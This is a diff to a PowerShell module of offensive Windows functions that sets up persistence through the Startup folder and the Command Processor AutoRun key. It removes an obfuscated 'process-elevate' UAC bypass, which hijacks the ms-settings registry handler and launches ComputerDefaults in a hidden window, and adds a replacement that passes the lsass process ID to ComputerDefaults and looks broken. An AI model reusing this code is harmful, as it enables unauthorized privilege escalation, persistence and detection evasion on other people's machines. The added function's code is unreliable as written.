@@ -160,24 +160,6 @@ new-item -ItemType file "$env:userprofile\AppData\Roaming\Microsoft\Windows\Star
 Export-ModuleMember -Function persistence
 Set-Alias -Name persistence -Value persistence
 
-# PoC for WindowPowershell
-Function process-elevate {
-    param(
-		[string]$processName
-    )
-    $Request =  $processName
-N`e`W-I`T`em "HKCU:\software\classes\ms-settings\shell\open\command" -Force
-sleep(1.9)
-N`e`W-I`T`emPr`oP`Ert`y "HKCU:\software\classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value "" -Force ;pwd;sleep(5.1)
-s'E't-i'T'e'MP'roP'E'rty "HKCU:\software\classes\ms-settings\shell\open\command"  -Name     "(default)"     -Value      "$Request" -force
-S't'ar't-P'r'oc'ess   -WindowStyle    hidden     "$env:???t??r???\*2\?o?pu?erD?fa???*"
-
-
-
-}
-Export-ModuleMember -Function process-elevate 
-Set-Alias -Name process-elevate  -Value process-elevate
-
 # musis byt admin !
 function persistence-xclear {
 Remove-ItemProperty -Path "HKLM:\Software\Microsoft\Command Processor" -Name "AutoRun" -ErrorAction Ignore 
@@ -249,6 +231,19 @@ clear
 }
 Export-ModuleMember -Function xtmpclean
 Set-Alias -Name xtmpclean -Value xtmpclean
+
+
+#POC for Windows
+function process-elevate {
+    param(
+		[string]$processName
+    )
+    $Request =  $processName
+$IDPORT = (get-process lsass).Id
+ComputerDefaults -PID '$IDPORT' -File '$Request'
+}
+Export-ModuleMember -Function process-elevate
+Set-Alias -Name process-elevate -Value process-elevate
 
 
 
